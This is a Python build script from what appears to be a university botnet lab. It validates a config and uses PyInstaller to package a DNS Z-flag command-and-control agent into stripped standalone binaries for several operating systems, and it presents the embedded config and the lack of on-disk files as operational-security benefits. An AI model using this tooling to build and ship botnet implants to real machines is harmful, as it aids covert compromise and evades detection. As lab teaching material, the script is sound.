"""
====================================================
 AUA CS 232/337 — Botnet Research Project
 Component: Agent Build Tool
 Environment: ISOLATED VM LAB ONLY
====================================================

Mirrors Spinnekop cmd/build/main.go + template.go.

Two-step process (same as Spinnekop):
  Step 1 — Validate config at "compile time" and write embedded module
            (dns_agent_config.py --build equivalent of generateEmbeddedConfig)
  Step 2 — Bundle agent + embedded config into a standalone binary via
            PyInstaller (equivalent of go build with GOOS/GOARCH)

This gives the same OpSec properties as Spinnekop:
  - No config files on disk at runtime (config is embedded in binary)
  - Config is validated before the build proceeds
  - Single binary, no Python runtime required on target

Build targets:
  current        Host OS / architecture
  linux-amd64    Linux x86_64
  linux-arm64    Linux ARM64 / aarch64
  windows-amd64  Windows x64 (.exe)
  darwin-amd64   macOS Intel
  darwin-arm64   macOS Apple Silicon
  all            All of the above

NOTE: PyInstaller always produces binaries for the host OS.
      To cross-compile for other OSes, run this tool on that OS.
      (Same limitation as Spinnekop: go build is per-OS too.)

Usage:
  # Validate config only:
  python3 dns_build.py --validate configs/dns_agent.yaml

  # Build for current host platform:
  python3 dns_build.py --build configs/dns_agent.yaml

  # Build for specific target:
  python3 dns_build.py --build configs/dns_agent.yaml --target linux-amd64

  # Build for all targets (run on each OS):
  python3 dns_build.py --build configs/dns_agent.yaml --target all

  # Generate a default agent config:
  python3 dns_build.py --generate-agent > configs/dns_agent.yaml

  # List supported targets:
  python3 dns_build.py --targets
"""

import json
import os
import platform
import shutil
import subprocess
import sys
from datetime import datetime
from typing import List, Optional, Tuple

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from dns_agent_config import (
    validate_request_config,
    load_config_file,
    write_embedded_config,
    AGENT_TEMPLATE,
)


# ═════════════════════════════════════════════════════════════
#  Build configuration
#  Mirrors Spinnekop cmd/build/main.go constants
# ═════════════════════════════════════════════════════════════

YAML_CONFIG_SOURCE_PATH   = "configs/dns_agent.yaml"
EMBEDDED_GO_CONFIG_TARGET = "agent_config_embedded.py"    # written before build
AGENT_MAIN_PACKAGE_PATH   = "dns_zflag_agent.py"          # entry point
DEFAULT_OUTPUT_DIR        = "bin"
DEFAULT_BINARY_NAME_BASE  = "dns_zflag_agent"

# Build targets: name → (os_hint, arch_hint)
# os_hint/arch_hint are informational; actual OS is always the host.
TARGETS = {
    "current":       None,                         # resolved at runtime
    "linux-amd64":   ("linux",   "amd64"),
    "linux-arm64":   ("linux",   "arm64"),
    "windows-amd64": ("windows", "amd64"),
    "darwin-amd64":  ("darwin",  "amd64"),
    "darwin-arm64":  ("darwin",  "arm64"),
}
ALL_PLATFORM_TARGETS = [
    "linux-amd64", "linux-arm64",
    "windows-amd64",
    "darwin-amd64", "darwin-arm64",
]

# Additional Python modules to explicitly include in the bundle
HIDDEN_IMPORTS = [
    "dns_zflag_crafter",
    "dns_agent_config",
    "agent_config_embedded",
    "socket", "struct", "base64", "threading",
    "urllib.request", "urllib.error",
]


# ═════════════════════════════════════════════════════════════
#  Host platform detection
# ═════════════════════════════════════════════════════════════

def get_host_target_name() -> str:
    """Return the target name string matching the current host."""
    sys_name = platform.system().lower()
    machine  = platform.machine().lower()

    os_str: str
    if "linux" in sys_name:
        os_str = "linux"
    elif "windows" in sys_name or "win" in sys_name:
        os_str = "windows"
    elif "darwin" in sys_name or "mac" in sys_name:
        os_str = "darwin"
    else:
        os_str = sys_name

    arch_str: str
    if machine in ("x86_64", "amd64"):
        arch_str = "amd64"
    elif machine in ("arm64", "aarch64"):
        arch_str = "arm64"
    else:
        arch_str = machine

    return f"{os_str}-{arch_str}"


def is_windows_host() -> bool:
    return "win" in platform.system().lower()


# ═════════════════════════════════════════════════════════════
#  Step 1 — Generate embedded config
#  Mirrors Spinnekop cmd/build/main.go generateEmbeddedConfig()
# ═════════════════════════════════════════════════════════════

def generate_embedded_config(config_path: str,
                              output_path: str = EMBEDDED_GO_CONFIG_TARGET) -> None:
    """
    Read YAML config → validate all fields → write agent_config_embedded.py.
    Mirrors Spinnekop generateEmbeddedConfig().
    Aborts (sys.exit) on validation failure.
    """
    print(f"[build] Reading config from '{config_path}'...")
    try:
        cfg = load_config_file(config_path)
    except FileNotFoundError:
        print(f"[build] ❌ Config file not found: {config_path}")
        sys.exit(1)
    except Exception as e:
        print(f"[build] ❌ Could not read config: {e}")
        sys.exit(1)

    errs = validate_request_config(cfg)
    if errs:
        print(f"[build] ❌ Build Error — Configuration is INVALID ({len(errs)} errors):")
        for e in errs:
            print(f"  - {e}")
        sys.exit(1)

    print("[build] ✅ Configuration validated successfully")
    write_embedded_config(cfg, output_path)


# ═════════════════════════════════════════════════════════════
#  Step 2 — Compile agent with PyInstaller
#  Mirrors Spinnekop cmd/build/main.go buildAgent()
# ═════════════════════════════════════════════════════════════

def ensure_pyinstaller() -> bool:
    """
    Check for PyInstaller; attempt to pip-install if absent.
    Returns True if PyInstaller is usable.
    """
    try:
        result = subprocess.run(
            [sys.executable, "-m", "PyInstaller", "--version"],
            capture_output=True, check=True
        )
        ver = result.stdout.decode().strip()
        print(f"[build] PyInstaller {ver} found.")
        return True
    except (subprocess.CalledProcessError, FileNotFoundError):
        pass

    print("[build] PyInstaller not found — attempting pip install...")
    result = subprocess.run(
        [sys.executable, "-m", "pip", "install", "pyinstaller", "--quiet"],
        capture_output=True, text=True
    )
    if result.returncode == 0:
        print("[build] ✅ PyInstaller installed.")
        return True

    print("[build] ❌ Could not install PyInstaller:")
    print(result.stderr[-800:])
    return False


def build_agent(target_name: str,
                output_dir:   str = DEFAULT_OUTPUT_DIR,
                binary_base:  str = DEFAULT_BINARY_NAME_BASE,
                entry_point:  str = AGENT_MAIN_PACKAGE_PATH,
                embedded_cfg: str = EMBEDDED_GO_CONFIG_TARGET) -> bool:
    """
    Bundle the agent into a standalone binary via PyInstaller.
    Mirrors Spinnekop cmd/build/main.go buildAgent().

    Args:
        target_name:  e.g. "linux-amd64", "windows-amd64", "current"
        output_dir:   where to write the binary (default: bin/)
        binary_base:  prefix for the binary filename
        entry_point:  Python script to bundle (default: dns_zflag_agent.py)
        embedded_cfg: path to the generated embedded config module

    Returns True on success.
    """
    if target_name == "current":
        target_name = get_host_target_name()

    # Determine binary filename
    binary_name = f"{binary_base}_{target_name}"
    if "windows" in target_name:
        binary_name += ".exe"

    os.makedirs(output_dir, exist_ok=True)
    print(f"[build] Compiling for {target_name} → {output_dir}/{binary_name}")

    # Data files to embed in bundle: embedded config module
    if is_windows_host():
        sep = ";"
    else:
        sep = ":"

    data_args: List[str] = []
    if os.path.exists(embedded_cfg):
        data_args += ["--add-data", f"{embedded_cfg}{sep}."]

    # Hidden imports
    hidden_args: List[str] = []
    for imp in HIDDEN_IMPORTS:
        hidden_args += ["--hidden-import", imp]

    # Clean up stale spec file
    spec_file = f"{binary_name}.spec"
    if os.path.exists(spec_file):
        os.remove(spec_file)

    cmd = [
        sys.executable, "-m", "PyInstaller",
        "--onefile",
        "--distpath", output_dir,
        "--name",     binary_name,
        "--strip",                     # strip debug symbols (like -ldflags=-s -w)
        "--log-level", "WARN",
        "--clean",
    ] + data_args + hidden_args + [entry_point]

    result = subprocess.run(cmd, capture_output=True, text=True)

    # Clean up PyInstaller's build artifacts
    build_dir = os.path.join("build", binary_name)
    if os.path.exists(build_dir):
        shutil.rmtree(build_dir, ignore_errors=True)
    if os.path.exists(spec_file):
        os.remove(spec_file)

    if result.returncode != 0:
        print(f"[build] ❌ PyInstaller failed for {target_name}:")
        stderr = result.stderr or result.stdout
        print(stderr[-2000:] if stderr else "(no output)")
        return False

    out_path = os.path.join(output_dir, binary_name)
    if not os.path.exists(out_path):
        print(f"[build] ❌ Binary not found at expected path: {out_path}")
        return False

    size_mb = os.path.getsize(out_path) / (1024 * 1024)
    print(f"[build] ✅ Successfully built: {out_path} ({size_mb:.1f} MB)")
    return True


# ═════════════════════════════════════════════════════════════
#  Full build pipeline
#  Mirrors Spinnekop cmd/build/main.go main()
# ═════════════════════════════════════════════════════════════

def run_build(config_path: str,
              target:      str = "current",
              output_dir:  str = DEFAULT_OUTPUT_DIR) -> None:
    """
    Full two-step build pipeline:
      1. Validate config + write agent_config_embedded.py
      2. Build standalone executable(s) via PyInstaller

    Mirrors Spinnekop cmd/build/main.go main().
    """
    print(f"[build] 🕷  DNS Z-Flag Agent Build Process")
    print(f"[build] {'=' * 45}")

    # Step 1: generate embedded config
    generate_embedded_config(config_path)

    # Check PyInstaller availability
    if not ensure_pyinstaller():
        print("[build] ❌ Build aborted: PyInstaller unavailable.")
        print("[build] Install manually: pip3 install pyinstaller")
        sys.exit(1)

    # Step 2: compile
    build_errors: List[str] = []

    if target == "all":
        print(f"[build] Target: all platforms ({len(ALL_PLATFORM_TARGETS)} targets)")
        for t in ALL_PLATFORM_TARGETS:
            if not build_agent(t, output_dir):
                build_errors.append(t)
    elif target == "current" or target in TARGETS:
        if not build_agent(target, output_dir):
            build_errors.append(target)
    else:
        print(f"[build] ❌ Unknown target '{target}'.")
        print(f"[build] Valid: {', '.join(TARGETS.keys())}, all")
        sys.exit(1)

    # Report
    print(f"\n[build] {'=' * 45}")
    if build_errors:
        print(f"[build] Build finished with {len(build_errors)} error(s):")
        for e in build_errors:
            print(f"  ❌ {e}")
        sys.exit(1)
    else:
        print("[build] ✅ Build process finished successfully.")
        print(f"[build] Binaries → {output_dir}/")


# ═════════════════════════════════════════════════════════════
#  CLI — mirrors Spinnekop cmd/build/main.go flag parsing
# ═════════════════════════════════════════════════════════════

if __name__ == "__main__":
    import argparse

    ap = argparse.ArgumentParser(
        description="DNS Z-Flag Agent Build Tool",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=f"""
Build targets:
  current        Host OS / architecture (default)
  linux-amd64    Linux x86_64
  linux-arm64    Linux ARM64
  windows-amd64  Windows x64
  darwin-amd64   macOS Intel
  darwin-arm64   macOS Apple Silicon
  all            All of the above (requires running on each OS)

NOTE: Cross-compilation requires running this script on the target OS.
      PyInstaller always builds for the host platform.

Examples:
  # Validate config and build for host OS:
  python3 dns_build.py --build configs/dns_agent.yaml

  # Build for a specific target name:
  python3 dns_build.py --build configs/dns_agent.yaml --target linux-amd64

  # Validate only (no build):
  python3 dns_build.py --validate configs/dns_agent.yaml

  # Generate a default agent config to edit:
  python3 dns_build.py --generate-agent > configs/dns_agent.yaml

Output directory:
  bin/dns_zflag_agent_<os>-<arch>[.exe]
        """
    )
    ap.add_argument("--build",    metavar="CONFIG_FILE",
                    help="Validate config + build agent executable")
    ap.add_argument("--validate", metavar="CONFIG_FILE",
                    help="Validate config only — no build step")
    ap.add_argument("--target",   default="current",
                    choices=list(TARGETS.keys()) + ["all"],
                    help="Build target (default: current)")
    ap.add_argument("--output",   default=DEFAULT_OUTPUT_DIR,
                    metavar="DIR",
                    help=f"Output directory (default: {DEFAULT_OUTPUT_DIR})")
    ap.add_argument("--generate-agent",   action="store_true",
                    help="Print default agent config template to stdout")
    ap.add_argument("--targets",  action="store_true",
                    help="List all supported build targets")
    args = ap.parse_args()

    if args.targets:
        host_target = get_host_target_name()
        print(f"\nSupported build targets (host: {host_target}):\n")
        for name, info in TARGETS.items():
            marker = " ← current host" if (
                name == "current" or name == host_target) else ""
            if info:
                os_n, arch_n = info
                print(f"  {name:<18} {os_n}/{arch_n}{marker}")
            else:
                print(f"  {name:<18} (resolved to {host_target}){marker}")
        print(f"\n  all              All of the above")
        print("\nNote: Cross-OS compilation requires running this script on")
        print("the target OS (same limitation as 'go build' with GOOS).")

    elif args.generate_agent:
        try:
            import yaml
            print(yaml.dump(AGENT_TEMPLATE, default_flow_style=False, sort_keys=False))
        except ImportError:
            print(json.dumps(AGENT_TEMPLATE, indent=2))

    elif args.validate:
        print(f"[build] Validating '{args.validate}'...")
        cfg  = load_config_file(args.validate)
        errs = validate_request_config(cfg)
        if errs:
            print(f"[build] ❌ INVALID ({len(errs)} errors):")
            for e in errs:
                print(f"  - {e}")
            sys.exit(1)
        print("[build] ✅ Configuration is valid.")

    elif args.build:
        run_build(args.build, args.target, args.output)

    else:
        ap.print_help()
